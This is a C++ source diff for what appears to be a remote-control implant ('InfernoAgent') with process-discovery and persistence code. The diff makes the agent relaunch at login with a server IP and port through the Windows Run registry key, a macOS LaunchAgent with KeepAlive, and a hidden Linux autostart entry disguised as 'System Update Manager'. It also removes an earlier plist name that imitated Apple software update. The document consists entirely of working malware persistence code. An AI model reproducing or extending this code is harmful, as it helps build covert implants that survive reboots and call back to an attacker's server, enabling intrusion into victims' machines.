@@ -358,17 +358,44 @@ void Agent::handleProcessDiscovery() {
     }
 }
 
-void Agent::installPersistence(const std::string& binary_path) {
+std::string resolveBinaryPath(const std::string& argv0) {
+    if (argv0.empty()) return {};
+#ifdef _WIN32
+    char abs_path[MAX_PATH];
+    if (GetFullPathNameA(argv0.c_str(), MAX_PATH, abs_path, nullptr)) {
+        return std::string(abs_path);
+    }
+    return argv0;
+#else
+    char* resolved = ::realpath(argv0.c_str(), nullptr);
+    if (resolved) {
+        std::string result(resolved);
+        ::free(resolved);
+        return result;
+    }
+    return argv0;
+#endif
+}
+
+void Agent::installPersistence(const std::string& binary_path,
+                                const std::string& server_ip,
+                                uint16_t server_port) {
     if (binary_path.empty()) return;
+
+    std::string abs_path = resolveBinaryPath(binary_path);
+    if (abs_path.empty()) return;
+
+    std::string port_str = std::to_string(server_port);
 
 #ifdef _WIN32
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        std::string cmd = "\"" + abs_path + "\" " + server_ip + " " + port_str;
         RegSetValueExA(hKey, "InfernoAgent", 0, REG_SZ,
-                       reinterpret_cast<const BYTE*>(binary_path.c_str()),
-                       static_cast<DWORD>(binary_path.size() + 1));
+                       reinterpret_cast<const BYTE*>(cmd.c_str()),
+                       static_cast<DWORD>(cmd.size() + 1));
         RegCloseKey(hKey);
     }
 #elif defined(__APPLE__)
@@ -376,13 +403,16 @@ void Agent::installPersistence(const std::string& binary_path) {
     if (!home) return;
 
     std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
-    std::string plist_path = plist_dir + "/com.apple.softwareupdate.helper.plist";
+    std::string plist_path = plist_dir + "/com.inferno.agent.plist";
 
     // Create directory
     ::mkdir(plist_dir.c_str(), 0755);
 
-    // Write plist XML
+    // Write plist XML — use restrictive umask so file is not world-writable
+    // launchd rejects world-writable plists with EIO error.
+    mode_t old_mask = ::umask(022);
     FILE* f = ::fopen(plist_path.c_str(), "w");
+    ::umask(old_mask);
     if (!f) return;
     std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
@@ -390,25 +420,25 @@ void Agent::installPersistence(const std::string& binary_path) {
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.apple.softwareupdate.helper</string>
+    <string>com.inferno.agent</string>
     <key>ProgramArguments</key>
     <array>
+        <string>%s</string>
+        <string>%s</string>
         <string>%s</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
-    <false/>
+    <true/>
 </dict>
 </plist>
-)", binary_path.c_str());
+)", abs_path.c_str(), server_ip.c_str(), port_str.c_str());
     ::fclose(f);
 
-    // Try modern bootstrap first, fall back to legacy load
-    int ret = ::system(("launchctl bootstrap gui/" + std::to_string(::geteuid()) + " " + plist_path + " 2>/dev/null").c_str());
-    if (ret != 0) {
-        ::system(("launchctl load " + plist_path + " 2>/dev/null").c_str());
-    }
+    // NOTE: No launchctl bootstrap/load needed — macOS automatically scans
+    // ~/Library/LaunchAgents/ at login and loads all plists found there.
+    // The agent is already running for the current session.
 #else
     // Linux: autostart .desktop file
     const char* home = ::getenv("HOME");
@@ -424,11 +454,11 @@ void Agent::installPersistence(const std::string& binary_path) {
     std::fprintf(f, R"([Desktop Entry]
 Type=Application
 Name=System Update Manager
-Exec=%s
+Exec=%s %s %s
 Hidden=true
 NoDisplay=true
 X-GNOME-Autostart-enabled=true
-)", binary_path.c_str());
+)", abs_path.c_str(), server_ip.c_str(), port_str.c_str());
     ::fclose(f);
 #endif
 }
